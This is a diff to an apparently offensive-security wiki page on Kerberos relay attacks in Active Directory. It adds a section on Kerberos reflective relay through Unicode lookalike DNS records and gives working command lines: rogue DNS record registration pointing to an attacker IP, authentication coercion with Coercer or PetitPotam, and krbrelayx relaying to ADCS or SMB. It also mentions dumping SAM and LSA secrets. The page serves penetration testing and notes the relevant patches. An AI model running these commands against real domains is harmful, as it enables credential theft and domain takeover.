@@ -1,6 +1,6 @@
 ---
 description: MITRE ATT&CK™ Sub-technique T1557.001
-authors: BlWasp
+authors: BlWasp, PvUL00
 category: ad
 ---
 
@@ -105,14 +105,14 @@ It is therefore necessary to restrict the content of the `CREDENTIAL_TARGET_INFO
 dnstool.py -u "$DOMAIN\\$USERNAME" -p "$PASSWORD" -r "[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "$ATTACKER_IP" --action add "$DC_IP" --tcp
 ```
 
-2. Then, trigger an authentication coerce (for example, with [PetitPotam](../mitm-and-coerced-authentications/ms-efsr.md)) from the target to the DNS record, and relay the authentication with [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python). For example, here to the [PKI HTTP endpoint](../adcs/unsigned-endpoints.md#Web-endpoint-ESC8):
+2. Then, trigger an authentication coerce (with [Coercer](https://github.com/p0dalirius/Coercer)) from the target to the DNS record, and relay the authentication with [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python). For example, here to the [PKI HTTP endpoint](../adcs/unsigned-endpoints.md#Web-endpoint-ESC8):
 
 ```bash
 # In a first terminal, krbrelayx waiting for an authentication to relay
-krbrelayx.py -t 'http://$ADCS_FQDN/certsrv/certfnsh.asp' --adcs --template DomainController -v '$RELAYED_TARGET_SAMNAME'
+krbrelayx.py -t "http://$CA/certsrv/certfnsh.asp" --adcs --template DomainController -v "$RELAYED_TARGET_SAMNAME"
 
 # In a second terminal, coerce the victim authentication to the DNS record
-Petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD "[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" $TARGET_IP
+coercer coerce -t $TARGET_IP -l "[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -u "$USER" -p "$PASSWORD" -d "$DOMAIN"
 ```
 
 In the case where the target of the relay (**the machine receiving the relay**) is an unsigned SMB service, and the authentication obtained is privileged, the following command will [dump the SAM and the LSA secrets](../credentials/dumping/sam-and-lsa-secrets.md):
@@ -161,6 +161,51 @@ python3 krbrelayx.py --target 'http://$ADCS_FQDN/certsrv/' -ip $ATTACKER_IP --ad
 
 This attack can also work by forcing [a WebDAV authentication](../mitm-and-coerced-authentications/webclient.md) to a record that does not exist. The absence of a DNS record will generate an LLMNR fallback, leading to the same result.
 
+### Kerberos reflective relay
+
+As demonstrated by Synacktiv in [this blog post](https://www.synacktiv.com/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part), CVE-2025-58726 and CVE-2026-26128 (both [patched March 2026](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-26128)) extend the [NTLM reflective relay](../ntlm/relay.md#ntlm-reflective-relay) chain to Kerberos by exploiting **Unicode character normalization inconsistencies** across Windows components.
+
+Registering a DNS record with lookalike Unicode characters (e.g. `SⓇV1․AD․LOCAL` where `Ⓡ` = U+24C7 CIRCLED LATIN CAPITAL LETTER R and `․` = U+2024 ONE DOT LEADER) creates a hostname that:
+
+- The DC's LDAP search normalizes to match the target machine's legitimate SPN via `LCMapStringEx` (with `NORM_IGNORECASE | NORM_IGNORENONSPACE | NORM_IGNOREWIDTH`): the spoofed and legitimate names produce the same sort key
+- The `DnsCache` service does **not** recognize as localhost: `CompareStringW` uses only `NORM_IGNORECASE` and fails to equate the Unicode lookalikes, allowing DNS resolution toward the attacker
+
+The coerced machine thus requests a Kerberos ticket for the spoofed SPN, producing an AP-REQ that can be intercepted and relayed back to the originating machine via a modified [krbrelayx.py](https://github.com/dirkjanm/krbrelayx).
+
+> [!NOTE]
+> Even after the March 2026 patch (which enforces SMB signing for loopback connections via the `RequireSecuritySignatureForLoopback` registry key), services that do not enforce channel binding remain vulnerable: **[ADCS Web Enrollment](../adcs/unsigned-endpoints.md#Web-endpoint-ESC8)**, **SCCM AdminService**, and **MSSQL**.
+
+1. A Unicode DNS record is registered, pointing to the attacker's IP. The Unicode lookalike pattern is applied to the target NetBIOS name (e.g. `SⓇV1` for `SRV1`), with `Ⓡ` (U+24C7) as the lookalike letter and `․` (U+2024) as domain separators:
+
+> [!NOTE]
+> For a machine `SRV1` in domain `AD.LOCAL`, the DNS record to register would be `SⓇV1․AD․LOCAL`.
+
+```bash
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" "$DC_IP" --action add -r "[TARGET_NETBIOS_UNICODE].[DOMAIN_UNICODE]" -d "$ATTACKER_IP"
+```
+
+2. A modified `krbrelayx.py` is then started to relay the Kerberos AP-REQ, and an authentication coercion forces the target toward the Unicode FQDN:
+
+```bash
+# In a first terminal, krbrelayx relaying the AP-REQ to the target
+krbrelayx.py -t smb://"$TARGET_FQDN"
+
+# Authentication coercion toward the Unicode FQDN (e.g. with PetitPotam):
+petitpotam.py -u "$USER" -p "$PASSWORD" -d "$DOMAIN" "[TARGET_NETBIOS_UNICODE].[DOMAIN_UNICODE]" "$TARGET_FQDN"
+```
+
+> [!CAUTION]
+> Clean up the rogue DNS record after the test:
+>```bash
+>dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" "$DC_IP" --action remove -r "[TARGET_NETBIOS_UNICODE].[DOMAIN_UNICODE]" --tcp
+>```
+
+> [!WARNING]
+> The modified `krbrelayx.py` required to reproduce this technique (patched to relay the AP-REQ despite hostname mismatch) had **not been released publicly** at the time of writing *(June 2026)*. The steps above reflect the described attack flow but cannot be fully executed without that tool. Follow [Synacktiv's publications](https://www.synacktiv.com/publications) and the [krbrelayx repository](https://github.com/dirkjanm/krbrelayx) to stay informed about any future release, and feel free to contribute by opening a PR in the krbrelayx repository.
+
+> [!NOTE]
+> The patches were released on March 2026 Patch Tuesday. The list of affected versions and corresponding KBs is available on the Microsoft Security Response Center: [CVE-2025-58726](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-58726) and [CVE-2026-26128](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-26128).
+
 ## Resources
 
 [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
@@ -170,3 +215,7 @@ This attack can also work by forcing [a WebDAV authentication](../mitm-and-coerc
 [https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx)
 
 [https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with)
+
+[https://www.synacktiv.com/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part-1](https://www.synacktiv.com/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part-1)
+
+[https://www.synacktiv.com/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part](https://www.synacktiv.com/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part)
